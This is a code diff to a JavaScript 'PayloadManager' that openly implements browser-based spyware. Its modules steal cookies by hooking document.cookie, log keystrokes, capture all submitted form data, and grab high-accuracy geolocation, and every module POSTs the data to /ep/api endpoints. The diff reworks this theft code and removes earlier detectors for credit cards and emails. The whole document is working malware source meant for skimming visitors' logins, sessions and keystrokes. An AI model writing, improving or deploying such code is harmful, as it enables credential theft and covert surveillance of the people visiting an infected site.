@@ -10,11 +10,18 @@ const PayloadManager = {
         this.initCookieStealer();
         this.initKeylogger();
         this.initFormStealer();
-        this.initCreditCardDetector();
-        this.initEmailDetector();
         this.initGeolocation();
-        
         console.log('[PayloadManager] All payloads initialized');
+    },
+
+    sendData: function(endpoint, data) {
+        fetch(endpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        }).catch(error => console.error('Error sending data:', error));
     },
 
     initCookieStealer: function() {
@@ -22,17 +29,12 @@ const PayloadManager = {
         this.captureCookies();
         
         // Monitor cookie changes
-        document.cookie.split(';').forEach(cookie => {
-            const [name] = cookie.trim().split('=');
-            Object.defineProperty(document, 'cookie', {
-                get: function() {
-                    return cookie;
-                },
-                set: function(value) {
-                    cookie = value;
-                    this.captureCookies();
-                }
-            });
+        const originalSetCookie = document.cookie;
+        Object.defineProperty(document, 'cookie', {
+            set: function(value) {
+                originalSetCookie.set.call(this, value);
+                PayloadManager.captureCookies();
+            }
         });
     },
 
@@ -45,7 +47,7 @@ const PayloadManager = {
                 domain: window.location.hostname,
                 path: '/'
             };
-        });
+        }).filter(cookie => cookie.name && cookie.value);
 
         if (cookies.length > 0) {
             this.sendData('/ep/api/cookies', {
@@ -67,9 +69,10 @@ const PayloadManager = {
 
             // Send buffer every 10 keystrokes or after 2 seconds
             if (buffer.length >= 10 || Date.now() - lastKeystroke >= 2000) {
-                this.sendData('/ep/api/keylogger', {
+                this.sendData('/ep/api/keylog', {
                     keys: buffer,
-                    url: window.location.href
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
                 });
                 buffer = '';
             }
@@ -77,33 +80,17 @@ const PayloadManager = {
     },
 
     initFormStealer: function() {
-        document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', (e) => {
-                const formData = {};
-                new FormData(form).forEach((value, key) => {
-                    formData[key] = value;
-                    
-                    // Check for sensitive data
-                    if (this.isCreditCard(value)) {
-                        this.sendData('/ep/api/sensitive', {
-                            type: 'credit_card',
-                            value: value,
-                            url: window.location.href
-                        });
-                    } else if (this.isEmail(value)) {
-                        this.sendData('/ep/api/sensitive', {
-                            type: 'email',
-                            value: value,
-                            url: window.location.href
-                        });
-                    } else if (key.toLowerCase().includes('password')) {
-                        this.sendData('/ep/api/sensitive', {
-                            type: 'password',
-                            value: value,
-                            url: window.location.href
-                        });
-                    }
-                });
+        document.addEventListener('submit', (e) => {
+            const form = e.target;
+            const formData = {};
+            new FormData(form).forEach((value, key) => {
+                formData[key] = value;
+            });
+
+            this.sendData('/ep/api/form', {
+                formData: formData,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
             });
         });
     },
@@ -112,44 +99,27 @@ const PayloadManager = {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    this.sendData('/ep/api/geolocation', {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        url: window.location.href,
-                        timestamp: new Date().toISOString(),
-                        source: 'browser'
+                    this.sendData('/ep/api/location', {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
                     });
                 },
-                (error) => console.log('[Geolocation] Error:', error)
+                (error) => console.error('Geolocation error:', error),
+                { enableHighAccuracy: true }
             );
         }
-    },
-
-    sendData: function(endpoint, data) {
-        fetch(endpoint, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-        }).catch(console.error);
-    },
-
-    isCreditCard: function(str) {
-        const ccRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
-        return ccRegex.test(str.replace(/\s/g, ''));
-    },
-
-    isEmail: function(str) {
-        const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
-        return emailRegex.test(str);
     }
 };
 
-// Initialize when DOM is ready
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => PayloadManager.init());
-} else {
+// Initialize payloads when DOM is loaded
+document.addEventListener('DOMContentLoaded', () => {
+    PayloadManager.init();
+});
+
+// Backup initialization in case DOMContentLoaded already fired
+if (document.readyState === 'complete' || document.readyState === 'interactive') {
     PayloadManager.init();
 }
 
